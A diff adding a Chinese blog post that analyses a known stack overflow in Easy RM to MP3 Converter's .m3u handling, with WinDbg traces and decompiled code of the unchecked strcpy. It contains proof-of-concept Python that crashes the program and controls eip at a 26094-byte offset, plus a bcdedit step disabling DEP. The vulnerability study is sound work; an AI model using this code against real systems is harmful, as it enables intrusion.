@@ -1,0 +1,1010 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next mist" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="google-site-verification" content="-rILWvtgf7gbffrRwk-E1VWNCVLMTcq6pxgs_1IfIjo" />
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="stack overflow,EasyRM2MP3" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="0x4C43's Blog" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="0x01 漏洞信息Easy RM to MP3 Converter 是一款音频文件格式转换工具，根据 Exploit-DB 给出的信息可知，该工具在转换 .m3u 文件时存在栈溢出漏洞。此外，漏洞程序可在 Exploit-DB 中下载。 0x02 漏洞分析调试环境如下：  操作系统：Windows7 SP1 64 bits调试器：Windbg 10.0.10586  由于 Windows7 系统默">
+<meta name="keywords" content="stack overflow">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EasyRM2MP3 栈溢出分析">
+<meta property="og:url" content="http://0x4c43.cn/2018/0814/easyrm2mp3-stack-overflow-analysis/index.html">
+<meta property="og:site_name" content="0x4C43's Blog">
+<meta property="og:description" content="0x01 漏洞信息Easy RM to MP3 Converter 是一款音频文件格式转换工具，根据 Exploit-DB 给出的信息可知，该工具在转换 .m3u 文件时存在栈溢出漏洞。此外，漏洞程序可在 Exploit-DB 中下载。 0x02 漏洞分析调试环境如下：  操作系统：Windows7 SP1 64 bits调试器：Windbg 10.0.10586  由于 Windows7 系统默">
+<meta property="og:updated_time" content="2018-10-28T20:22:00.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="EasyRM2MP3 栈溢出分析">
+<meta name="twitter:description" content="0x01 漏洞信息Easy RM to MP3 Converter 是一款音频文件格式转换工具，根据 Exploit-DB 给出的信息可知，该工具在转换 .m3u 文件时存在栈溢出漏洞。此外，漏洞程序可在 Exploit-DB 中下载。 0x02 漏洞分析调试环境如下：  操作系统：Windows7 SP1 64 bits调试器：Windbg 10.0.10586  由于 Windows7 系统默">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://0x4c43.cn/2018/0814/easyrm2mp3-stack-overflow-analysis/"/>
+
+
+
+
+
+
+
+  <title> EasyRM2MP3 栈溢出分析 | 0x4C43's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0x4C43's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://0x4c43.cn/2018/0814/easyrm2mp3-stack-overflow-analysis/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0x4C43">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/binary.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0x4C43's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                EasyRM2MP3 栈溢出分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-14T17:50:00+08:00">
+                2018-08-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Vulnerability-Analysis/" itemprop="url" rel="index">
+                    <span itemprop="name">Vulnerability Analysis</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/0814/easyrm2mp3-stack-overflow-analysis/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/0814/easyrm2mp3-stack-overflow-analysis/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">阅读次数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h1><p>Easy RM to MP3 Converter 是一款音频文件格式转换工具，根据 Exploit-DB 给出的<a href="https://www.exploit-db.com/exploits/9186/" target="_blank" rel="external">信息</a>可知，该工具在转换 .m3u 文件时存在栈溢出漏洞。此外，漏洞程序可在 Exploit-DB 中下载。</p>
+<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>调试环境如下：</p>
+<blockquote>
+<p>操作系统：Windows7 SP1 64 bits<br>调试器：Windbg 10.0.10586</p>
+</blockquote>
+<p>由于 Windows7 系统默认开启 DEP 保护，利用该漏洞时，为了返回到栈上执行 shellcode，需要把系统 DEP 关闭。<br>（1）“命令运行符” -&gt; “以管理员身份运行”；<br>（2）运行 bcdedit.exe/set {current} nx AlwaysOff；<br>（3）重启计算机生效。</p>
+<h2 id="1-漏洞复现"><a href="#1-漏洞复现" class="headerlink" title="1. 漏洞复现"></a>1. 漏洞复现</h2><p>首先使用以下脚本生成一个 .m3u 文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">payload = <span class="number">30000</span> * <span class="string">"A"</span></div><div class="line">f = open(<span class="string">"crash.m3u"</span>,<span class="string">"w"</span>)</div><div class="line">f.write(payload)</div></pre></td></tr></table></figure></p>
+<p>WinDbg 中直接运行程序，加载 crash.m3u 文件后将会触发栈溢出，此时 eip 寄存器值为 0x41414141。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(ddc.10b0): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=00000001 ebx=00164a1c ecx=7701387a edx=00580600 esi=76942960 edi=00007530</div><div class="line">eip=41414141 esp=0015f614 ebp=006031c8 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</div><div class="line">41414141 ??              ???</div></pre></td></tr></table></figure></p>
+<p>使用 mona.py 插件可计算出覆盖 eip 所需要填充的字符数量为 26094，从而精确控制 eip 指向的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">offset = <span class="number">26094</span></div><div class="line">payload = offset*<span class="string">"A"</span> + <span class="string">"B"</span>*<span class="number">4</span></div><div class="line">f = open(<span class="string">"crash.m3u"</span>,<span class="string">"w"</span>)</div><div class="line">f.write(payload)</div></pre></td></tr></table></figure></p>
+<p>再次运行程序并加载 crash.m3u 文件，可看到 eip 执行 0x42424242。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(da0.ae0): Access violation - code c0000005 (first chance)</div><div class="line">First chance exceptions are reported before any exception handling.</div><div class="line">This exception may be expected and handled.</div><div class="line">eax=00000001 ebx=00164a1c ecx=7701387a edx=00590600 esi=76942960 edi=000065f2</div><div class="line">eip=42424242 esp=0015f614 ebp=005b31c8 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206</div><div class="line">42424242 ??              ???</div></pre></td></tr></table></figure></p>
+<h2 id="2-漏洞定位"><a href="#2-漏洞定位" class="headerlink" title="2. 漏洞定位"></a>2. 漏洞定位</h2><p>由于程序崩溃时，查看调用栈不能得到有效的信息，无法通过栈回溯的方法定位到漏洞位置。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</div><div class="line"> <span class="comment"># ChildEBP RetAddr  Args to Child</span></div><div class="line">WARNING: Frame IP <span class="keyword">not</span> <span class="keyword">in</span> any known module. Following frames may be wrong.</div><div class="line"><span class="number">00</span> <span class="number">0015</span>f610 <span class="number">00000000</span> <span class="number">00000006</span> <span class="number">00164</span>a1c <span class="number">00000001</span> <span class="number">0x42424242</span></div></pre></td></tr></table></figure></p>
+<p>因为该程序未开启 ASLR，所以每次运行时栈中缓冲区的地址都相同。此外，栈溢出漏洞触发时必须要往缓冲区写数据，因此，在缓冲区起始地址处设置内存写断点，即可找到漏洞位置。</p>
+<p>首先需要计算出缓冲区起始地址，程序崩溃时，esp-8 的位置为覆盖返回地址的数据。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; d esp<span class="number">-8</span></div><div class="line"><span class="number">0015</span>f60c  <span class="number">42424242</span> <span class="number">005</span>b3100 <span class="number">00000000</span> <span class="number">00000006</span></div><div class="line"><span class="number">0015</span>f61c  <span class="number">00164</span>a1c <span class="number">00000001</span> <span class="number">00000000</span> <span class="number">005</span>c0000</div><div class="line"><span class="number">0015</span>f62c  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div><div class="line"><span class="number">0015</span>f63c  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div></pre></td></tr></table></figure></p>
+<p>根据前面计算出的偏移量，可倒推出缓冲区起始地址为 0x‭15901E‬（0x0015f60c-26094）。重新运行程序，使用以下命令设置断点后继续运行，载入文件之前触发的断点无需关注。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; ba w <span class="number">1</span> <span class="number">0x15901e</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</div><div class="line"> <span class="number">0</span> e <span class="number">0015901</span>e w <span class="number">1</span> <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** </div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</div></pre></td></tr></table></figure></p>
+<p>载入 crash.m3u 文件后继续运行，可触发 2 次断点。第二次断下的位置为 MSRMfilter03!Playlist_FindNextItem+0x53 （0x10008d93），该指令进行数据拷贝操作，即为漏洞触发点。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Breakpoint <span class="number">0</span> hit</div><div class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">0000087</span>b edx=<span class="number">06317540</span> esi=<span class="number">76942960</span> edi=<span class="number">00159020</span></div><div class="line">eip=<span class="number">0041e318</span> esp=<span class="number">00156</span>ce4 ebp=<span class="number">002731</span>c8 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00010206</span></div><div class="line">image00400000+<span class="number">0x1e318</span>:</div><div class="line"><span class="number">0041e318</span> f3ab            rep stos dword ptr es:[edi]</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</div><div class="line">Breakpoint <span class="number">0</span> hit</div><div class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">0000197</span>c edx=<span class="number">00006605</span> esi=<span class="number">06</span>ed14a4 edi=<span class="number">00159020</span></div><div class="line">eip=<span class="number">10008</span>d93 esp=<span class="number">00156</span>cc8 ebp=<span class="number">002731</span>c8 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00010206</span></div><div class="line">MSRMfilter03!Playlist_FindNextItem+<span class="number">0x53</span>:</div><div class="line"><span class="number">10008</span>d93 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd <span class="number">0x15901e</span></div><div class="line"><span class="number">0015901</span>e  <span class="number">00004141</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></div><div class="line"><span class="number">0015902</span>e  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></div><div class="line"><span class="number">0015903</span>e  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></div></pre></td></tr></table></figure></p>
+<p>此时查看调用栈如下，MSRMfilter03!Playlist_FindNextItem 在 image00400000 中调用，且返回地址为 0041e3f6。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; kb</div><div class="line"> <span class="comment"># ChildEBP RetAddr  Args to Child</span></div><div class="line">WARNING: Stack unwind information <span class="keyword">not</span> available. Following frames may be wrong.</div><div class="line"><span class="number">00</span> <span class="number">00156</span>cd8 <span class="number">0041e3</span>f6 <span class="number">0015900</span>c <span class="number">000065</span>f2 <span class="number">76942960</span> MSRMfilter03!Playlist_FindNextItem+<span class="number">0x53</span></div><div class="line"><span class="number">01</span> <span class="number">00156</span>cdc <span class="number">0015900</span>c <span class="number">000065</span>f2 <span class="number">76942960</span> <span class="number">002731</span>c8 image00400000+<span class="number">0x1e3f6</span></div><div class="line"><span class="number">02</span> <span class="number">00156</span>ce0 <span class="number">00000000</span> <span class="number">76942960</span> <span class="number">002731</span>c8 <span class="number">00164</span>a1c <span class="number">0x15900c</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</div><div class="line">Breakpoint <span class="number">0</span> hit</div><div class="line">eax=<span class="number">00006605</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">000010</span>b9 edx=<span class="number">00156</span>d04 esi=<span class="number">0015</span>b32c edi=<span class="number">00159024</span></div><div class="line">eip=<span class="number">0041e553</span> esp=<span class="number">00156</span>ce4 ebp=<span class="number">002731</span>c8 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00010206</span></div><div class="line">image00400000+<span class="number">0x1e553</span>:</div><div class="line"><span class="number">0041e553</span> f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd <span class="number">0x15901e</span></div><div class="line"><span class="number">0015901</span>e  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div><div class="line"><span class="number">0015902</span>e  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div><div class="line"><span class="number">0015903</span>e  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div><div class="line"><span class="number">0015904</span>e  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span></div></pre></td></tr></table></figure></p>
+<h2 id="3-漏洞成因"><a href="#3-漏洞成因" class="headerlink" title="3. 漏洞成因"></a>3. 漏洞成因</h2><p>使用 IDA 加载 MSRMfilter03.dll，跟进到 0x10008d93 分析可知，Playlist_FindNextItem() 函数中使用 strcpy 将 v1 复制给 a1 时未进行长度检查，当复制过长数据到 a1 时会导致栈溢出。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">Playlist_FindNextItem</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line"></div><div class="line">  sub_10008DE0(<span class="number">5</span>, aDebugPlaylistF, aDMpf20Mplayerm, <span class="number">192</span>);</div><div class="line">  v1 = (<span class="keyword">const</span> <span class="keyword">char</span> *)sub_10006850((<span class="keyword">int</span>)dword_1004D600, <span class="number">1</span>);</div><div class="line">  <span class="keyword">if</span> ( v1 )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">strcpy</span>(a1, v1);    <span class="comment">// overflow!!!</span></div><div class="line">    sub_10008DE0(<span class="number">5</span>, aDebugPlaylistF_0, aDMpf20Mplayerm, <span class="number">205</span>);</div><div class="line">    result = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    sub_10008DE0(<span class="number">5</span>, aDebugPlaylistF_1, aDMpf20Mplayerm, <span class="number">201</span>);</div><div class="line">    result = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>接下来分析 strcpy 的两个参数，源字符串 v1 为 sub_10006850 函数的返回值。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; u <span class="number">10008</span>D5E</div><div class="line">MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span>:</div><div class="line"><span class="number">10008</span>d5e e8eddaffff      call    MSRMfilter03+<span class="number">0x6850</span> (<span class="number">10006850</span>)</div><div class="line"><span class="number">10008</span>d63 <span class="number">83</span>c418          add     esp,<span class="number">18</span>h</div><div class="line"><span class="number">10008</span>d66 <span class="number">85</span>c0            test    eax,eax</div><div class="line"><span class="number">10008</span>d68 <span class="number">7444</span>            je      MSRMfilter03!Playlist_FindNextItem+<span class="number">0x6e</span> (<span class="number">10008</span>dae)</div><div class="line"><span class="number">10008</span>d6a <span class="number">56</span>              push    esi</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bu <span class="number">10008</span>d5e</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</div><div class="line"> <span class="number">0</span> e <span class="number">10008</span>d5e     <span class="number">0001</span> (<span class="number">0001</span>)  <span class="number">0</span>:**** MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span></div></pre></td></tr></table></figure></p>
+<p>因此在调用该函数的位置下断点，程序断下时查看其返回值为文件路径加上输入的数据。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bu MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; bl</div><div class="line"> <span class="number">0</span> eu             <span class="number">0001</span> (<span class="number">0001</span>) (MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span>)</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</div><div class="line">Breakpoint <span class="number">0</span> hit</div><div class="line">eax=<span class="number">02900600</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">7701387</span>a edx=<span class="number">02900700</span> esi=<span class="number">005</span>f31e4 edi=<span class="number">0015</span>f60c</div><div class="line">eip=<span class="number">10008</span>d5e esp=<span class="number">00156</span>cc4 ebp=<span class="number">005</span>f31c8 iopl=<span class="number">0</span>         nv up ei pl nz na po nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00000202</span></div><div class="line">MSRMfilter03!Playlist_FindNextItem+<span class="number">0x1e</span>:</div><div class="line"><span class="number">10008</span>d5e e8eddaffff      call    MSRMfilter03+<span class="number">0x6850</span> (<span class="number">10006850</span>)</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; p</div><div class="line">eax=<span class="number">06e71490</span> ebx=<span class="number">00164</span>a1c ecx=<span class="number">029005</span>a0 edx=<span class="number">00000000</span> esi=<span class="number">005</span>f31e4 edi=<span class="number">0015</span>f60c</div><div class="line">eip=<span class="number">10008</span>d63 esp=<span class="number">00156</span>cc4 ebp=<span class="number">005</span>f31c8 iopl=<span class="number">0</span>         nv up ei pl nz na pe nc</div><div class="line">cs=<span class="number">0023</span>  ss=<span class="number">002</span>b  ds=<span class="number">002</span>b  es=<span class="number">002</span>b  fs=<span class="number">0053</span>  gs=<span class="number">002</span>b             efl=<span class="number">00000206</span></div><div class="line">MSRMfilter03!Playlist_FindNextItem+<span class="number">0x23</span>:</div><div class="line"><span class="number">10008</span>d63 <span class="number">83</span>c418          add     esp,<span class="number">18</span>h</div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc eax</div><div class="line"><span class="number">06e71490</span>  <span class="number">455</span>c3a44 <span class="number">6</span>f6c7078 <span class="number">565</span>c7469 <span class="number">70416</span>c75  D:\Exploit\VulAp</div><div class="line"><span class="number">06e714</span>a0  <span class="number">41415</span>c70 <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span>  p\AAAAAAAAAAAAAA</div><div class="line"><span class="number">06e714</span>b0  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span>  AAAAAAAAAAAAAAAA</div><div class="line"><span class="number">06e714</span>c0  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span>  AAAAAAAAAAAAAAAA</div><div class="line"><span class="number">06e714</span>d0  <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span> <span class="number">41414141</span>  AAAAAAAAAAAAAAAA</div></pre></td></tr></table></figure></p>
